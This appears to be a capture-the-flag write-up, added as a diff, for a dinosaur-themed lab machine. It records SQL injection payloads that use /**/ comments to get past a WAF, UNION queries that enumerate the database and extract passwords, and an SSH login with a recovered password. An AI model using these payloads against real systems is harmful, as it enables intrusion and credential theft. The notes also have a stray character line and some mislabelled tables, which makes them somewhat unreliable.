@@ -1,0 +1,82 @@
+Ports:
+22 : ssh
+80 : http
+
+
+
+1368;=@BEGJMORTWY\^acfhknqsvx{}
+
+# FINDS
+
+### ROBOTS.TXT
+Wubbalubbadubdub
+
+
+
+On one of the source codes of the web pages, we found the following endpouint:
+
+ /item.php?id=3 
+
+here we try the id=3' and we get the permission denied, Which gave us the idea that there might be a possibility of the sql injectoin attack.
+
+We try the sql map in this link. 
+::::
+After changing the ?id=1 parameter to 5 we got the followinf message :
+Dennis, why have you blocked these characters: ' # DROP - username @ ---- Is this our WAF now?
+there for using ' # - @ 
+::::is forbidden, there fore we need to look for a bypass::::
+
+OK  THE sqlmap did not work 
+But we did by pass the sql injection using:
+?id=5 AND 1=1/**/
+or 
+?id=5/**/OR/**/1=1
+
+- UNION SELECT null,null,null,null,null/**/
+- UNION SELECT null,null,null,null,version()/**/  ::
+ ** 5.7.25-0ubuntu0.16.04.2 **
+
+-Database
+UNION SELECT null,null,null,null,database()/**/   ::
+  ** park **
+
+-version
+UNION SELECT null,null,null,null,version()/**/
+ ** 5.7.25-0ubuntu0.16.04.2 **
+
+-Tables
+ UNION SELECT null,null,null,null,table_name FROM information_schema.tables WHERE table_schema=database()limit /**/  ::::
+   ** users **
+   ** items **
+   
+- id=5 UNION SELECT null,null,null,null,column_name FROM information_schema.columns WHERE table_name=0x7573657273/**/ 
+'users' = 0x7573657273
+'items' = 0x6974656d73
+
+'items' = 0x6974656d73
+  username
+  sold
+  price
+  password
+  information
+  id
+
+:::users:::  0x7573657273
+  USER
+  TOTAL_CONNECTIONS
+  CURRENT_CONNECTIONS
+
+-Passwords
+  id=5 UNION SELECT null,null,null,null,password FROM users LIMIT 1,1/**/
+  
+  ih8dinos
+  D0nt3ATM3
+  
+::
+Now we will try this password at the usename password field withe the username : Dennis
+
+##
+ssh dennin@ip-address to get the shell
+enter the password
+ih8dinos
+
